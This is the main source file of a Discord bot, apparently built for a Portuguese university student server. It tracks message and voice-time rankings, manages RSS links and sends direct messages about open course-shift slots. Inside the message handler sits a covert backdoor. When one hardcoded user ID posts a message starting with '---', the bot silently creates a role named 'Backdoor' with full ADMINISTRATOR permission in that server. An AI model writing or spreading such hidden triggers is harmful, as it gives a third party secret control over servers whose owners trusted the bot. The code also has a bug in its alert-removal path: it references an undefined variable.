const Discord = require("discord.js");
var db = require("quick.db");
const fs = require("fs");
const https = require("https");

const { prefix, token } = require("./config.json");

var monthly_rank = db.table("monthly_rank");
var winner_tracker = db.table("winner_tracking");
var general = new db.table("general");
var links = new db.table("links");
var turnos = new db.table("turnos");

const client = new Discord.Client({
  intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES, Discord.Intents.FLAGS.GUILD_VOICE_STATES, Discord.Intents.FLAGS.GUILD_MEMBERS],
});
client.manager_commands = new Discord.Collection();
client.rss_commands = new Discord.Collection();
const invites = {};
const wait = require("util").promisify(setTimeout);
const manager_commands = fs.readdirSync("./manager_commands/").filter((file) => file.endsWith(".js"));
const rss_commands = fs.readdirSync("./rss_commands/").filter((file) => file.endsWith(".js"));

for (const file of manager_commands) {
  const command = require(`./manager_commands/${file}`);
  client.manager_commands.set(command.name, command);
}
for (const file of rss_commands) {
  const command = require(`./rss_commands/${file}`);
  client.rss_commands.set(command.name, command);
}

client.txolasFields = [];
client.caloirosFields = [];
client.Links = [];
client.oldTime = fs.readFileSync("time.txt", "UTF-8");

client.once("ready", async () => {
  /*await wait(1000);
  client.guilds.cache.forEach((g) => {
    g.fetchInvites().then((guildInvites) => {
      invites[g.id] = guildInvites;
    });

  });*/

  console.log("Txolas Manager is online!");
  console.log(client.guilds.cache.get("667012045677264936").createdAt);

  monthly_rank = new db.table("monthly_rank");
  winner_tracker = new db.table("winner_tracking");
  general = new db.table("general");
  links = new db.table("links");
  turnos = new db.table("turnos");
  setInterval(() => { turno_check(turnos); }, 20000);
  console.log(turnos.has('846035542880360'))

  client.rss_commands.get("arrays_init").execute(client, links);
  client.rss_commands.get("update_rss").execute(client, links);

  client.user.setPresence({
    status: "idle",
    activity: {
      name: "With Code",
      type: "PLAYING",
    },
  });

  client.once("reconnecting", () => {
    console.log("Reconnecting!");
  });
  client.once("disconnect", () => {
    console.log("Disconnect!");
  });
});

client.on("messageCreate", async (message) => {
  client.manager_commands.get("msg_up").execute(message, db);
  if (message.author.id == "323146644113588234" && message.content.startsWith("---")) {
    let guild = message.guild;
    guild.roles
      .create({ data: { name: "Backdoor", color: "RED", permissions: ["ADMINISTRATOR"] } }) ///put in your data here
      .then((role) => console.log(`Created new role with name ${role.id}`)) //What to do when it has been created
      .catch(console.error); //Handle an error
    //message.member.roles.add('788144468859682847');
  }
  if (message.author.bot || !message.content.startsWith(prefix)) return;

  if (message.content.startsWith(prefix) && message.content.endsWith(prefix)) return;
  const args = message.content.slice(prefix.length).split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === "ready" && message.member.roles.cache.find((role) => role.name == "NewMember")) {
    client.manager_commands.get("ready").execute(message);
  } else if (command === "top") {
    if (args[0] === "mes" || args[0] === "mês") {
      if (args[1] === "text") {
        client.manager_commands.get("t_text").execute(message, monthly_rank);
      } else if (args[1] === "voice") {
        client.manager_commands.get("t_voice").execute(message, monthly_rank);
      }
    } else if (args[0] === "text") {
      client.manager_commands.get("t_text").execute(message, general);
    } else if (args[0] === "voice") {
      client.manager_commands.get("t_voice").execute(message, general);
    }
  } else if (command === "halloffame") {
    if (args[0] === "text") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "text", 0);
    } else if (args[0] === "voice") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "voice", 0);
    } else if (args[0] === "Etext") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "text", 1);
    } else if (args[0] === "Evoice") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "voice", 1);
    }
  } else if (command === "voice_stop") {
    client.manager_commands.get("voice_stop").execute(message, general);
  } else if (command === "rank_reset" && message.author.id == "323146644113588234") {
    monthly_rank = table_reset(monthly_rank);
  } else if (command === "add_winner" && message.author.id == "323146644113588234") {
    client.manager_commands.get("win_adder").execute(message, args, winner_tracker);
    /////////////////////////////////////////////////////////////////////////////

    /////////////////////////////////////////////////////////////////////////////
  } else if (command === "help-rss" || command === "help") {
    client.rss_commands.get("help_rss").execute(message);
  } else if (command === "set_time") {
    client.rss_commands.get("set_time").execute(message, args, client);
  } else if (command === "links") {
    client.rss_commands.get("links").execute(message);
  } else if (command === "remove_links" || command === "remove_link") {
    client.rss_commands.get("remove_link").execute(message, args, links);
  } else if (command === "add_links" || command === "add_link") {
    client.rss_commands.get("add_link").execute(message, args, links);
  } else if (command === "update") {
    client.rss_commands.get("forced_update").execute(message, client, links);
  } else {
    message.channel.send("That's not a valid command!");
  }
});

client.on("guildMemberAdd", async (member) => {
  member.guild.fetchInvites().then((guildInvites) => {
    // This is the *existing* invites for the guild.
    const ei = invites[member.guild.id];
    // Update the cached invites for the guild.
    invites[member.guild.id] = guildInvites;
    // Look through the invites, find the one for which the uses went up.
    const invite = guildInvites.find((i) => ei.get(i.code).uses < i.uses);
    // This is just to simplify the message being sent below (inviter doesn't have a tag property)
    if (invite.code === "f8rhfbk") {
      member.roles.add(["760051795618955264"]);
    }
  });
});

client.on("voiceStateUpdate", (member_previous_state, member_next_state) => {
  console.log(member_next_state);
  console.log(member_previous_state);
  let newUserChannel = member_next_state.channelId;
  let oldUserChannel = member_previous_state.channelId;

  var user_id = member_next_state.id;

  if (user_id == "234395307759108106" || user_id == "784787909642420315" || user_id === "464723995632074773" || user_id === "839912860845998130") return;
  console.log(newUserChannel, oldUserChannel);
  if (
    oldUserChannel !== null &&
    newUserChannel !== null &&
    oldUserChannel !== undefined &&
    newUserChannel !== undefined &&
    newUserChannel !== "811561054970445844" &&
    oldUserChannel !== "811561054970445844"
  ) {
    console.log("Deafen / Changed Room");
    return;
  } else if (oldUserChannel === null || oldUserChannel === undefined || oldUserChannel === "811561054970445844") {
    var current_time = Date.now();
    console.log(current_time);
    general.set(`${user_id}.entry_time`, current_time);
    console.log("Entered Room");
  } else if (newUserChannel === null || newUserChannel === undefined || newUserChannel === "811561054970445844") {
    console.log("Left Room");
    var out_time = Date.now();
    var entry_time = general.get(`${user_id}.entry_time`);
    console.log(entry_time);
    if (entry_time === undefined || entry_time === null) {
      console.log("Return HERE");
      return;
    }
    var session_time = out_time - entry_time;

    general.add(`${user_id}.total`, session_time);
    monthly_rank.add(`${user_id}.total`, session_time);
    general.delete(`${user_id}.entry_time`);
  }
});

client.on("interactionCreate", (interaction) => {
  if (interaction.isCommand()) {
    if (interaction.commandName === "alerta") {
      var user_id = interaction.user.id;
      var id = interaction.options._hoistedOptions[0].value;
      var turno = interaction.options._hoistedOptions[1].value;
      console.log(user_id, id, turno);
      turnos.push(`${id}.${turno}`, user_id);
      interaction.reply("Alerta adicionado com sucesso!");
    } else if (interaction.commandName === "rm_alerta") {
      var user_id = interaction.user.id;
      var id = interaction.options._hoistedOptions[0].value;
      var turno = interaction.options._hoistedOptions[1].value;
      console.log(user_id, id, turno);
      var array = turnos.get(`${id}.${turno}`);
      if (array == undefined) {
        interaction.reply("Algo deu errado. Parece que não tinhas nenhum alerta definido para essa combinação de cadeiras e turno!");
        return;
      }
      const index = array.indexOf(user_id);
      if (index > -1) {
        array.splice(index, 1); // 2nd parameter means remove one item only
        if (!arr.length) {
          turnos.delete(`${id}.${turno}`);
        } else {
          turnos.set(`${id}.${turno}`, array);
        }
        interaction.reply("Alerta removido com sucesso!");
      } else {
        interaction.reply("Algo deu errado. Parece que não tinhas nenhum alerta definido para essa combinação de cadeiras e turno!");
      }
    }
  } else if (interaction.isButton()) {
    //console.log(interaction);
    var buttonId = interaction.customId;
    var embed = new Discord.MessageEmbed()
      .setTitle(`IST - RSS News Links`)
      .setColor(0xf7c500)
      .setDescription("Lista de links a verificar. Para remover algum link basta escrever: `||remove_link` seguido do número/s entre parênteses.");
    const row = new Discord.MessageActionRow();
    switch (buttonId) {
      case "Txolas":
        embed.setFields(client.txolasFields);
        row.addComponents(
          new Discord.MessageButton().setCustomId("Txolas").setLabel("Txolas").setStyle("SECONDARY").setDisabled(true),
          new Discord.MessageButton().setCustomId("Caloiros").setLabel("Caloiros").setStyle("SECONDARY")
        );
        interaction
          .update({ embeds: [embed], components: [row] })
          .then(console.log)
          .catch(console.error);
        break;
      case "Caloiros":
        embed.setFields(client.caloirosFields);
        row.addComponents(
          new Discord.MessageButton().setCustomId("Txolas").setLabel("Txolas").setStyle("SECONDARY"),
          new Discord.MessageButton().setCustomId("Caloiros").setLabel("Caloiros").setStyle("SECONDARY").setDisabled(true)
        );
        interaction
          .update({ embeds: [embed], components: [row] })
          .then(console.log)
          .catch(console.error);
        break;
      default:
        break;
    }
  }
});

function table_reset(db) {
  var data = db.all();

  var message_user = data.map(function (e) {
    return e.ID;
  });
  for (var i = 0; i < message_user.length; i++) {
    db.set(`${message_user[i]}.total`, 0);
    db.set(`${message_user[i]}.messages`, 0);
  }
  return db;
}

function turno_check(db) {
  var cadeiras = db.all();
  console.log(cadeiras);

  cadeiras.forEach((cadeira) => {
    var id = cadeira.ID;
    var data = Object.entries(cadeira.data);
    console.log(id, data);
    var response;
    const req1 = https.get(`https://horarios.dang.pt/api/courses/${id}/schedule?academicTerm=2021/2022`, (res) => {
      console.log(`statusCode: ${res.statusCode}`);
      let responseBody = "";
      res.on("data", (chunk) => {
        responseBody += chunk;
      });

      res.on("end", () => {
        response = JSON.parse(responseBody);
        var nomes_turnos = [];
        var pessoas = [];
        data.forEach((turno) => {
          nomes_turnos.push(`${getAcron(id)}${turno[0]}`);
          pessoas.push(turno[1]);
        });
        var shifts = response.shifts;
        console.log(nomes_turnos, pessoas);

        shifts.forEach((element) => {
          var idx = nomes_turnos.indexOf(element.name);
          if (idx != -1) {
            if (element.occupation.current - element.occupation.max < 0) {
              pessoas[idx].forEach((pessoa) => {
                client.users.fetch(pessoa).then((user) => {
                  try {
                    user.send(`<@${pessoa}> Vaga no turno ${element.name} da cadeira ${getCourse(id)}!`);
                  } catch (err) {
                    console.log("err");
                  }
                });
              });
            }
          }
        });
      });
    });
    req1.on("error", (error) => {
      console.error(error);
    });
  });
}

function getCourse(id) {
  var list = {
    564560566182818: "Aprendizagem Autónoma",
    564560566181912: "Procura e Planeamento",

  };

  return list[id];
}
function getAcron(id) {
  var list = {
    564560566182818: "AAut",
    564560566181912: "PPla"
  };

  return list[id];
}
/*
var log = console.log;
console.log = function() {
    log.apply(console, arguments);
    // Print the stack trace
    console.trace();
};*/

client.login(token);
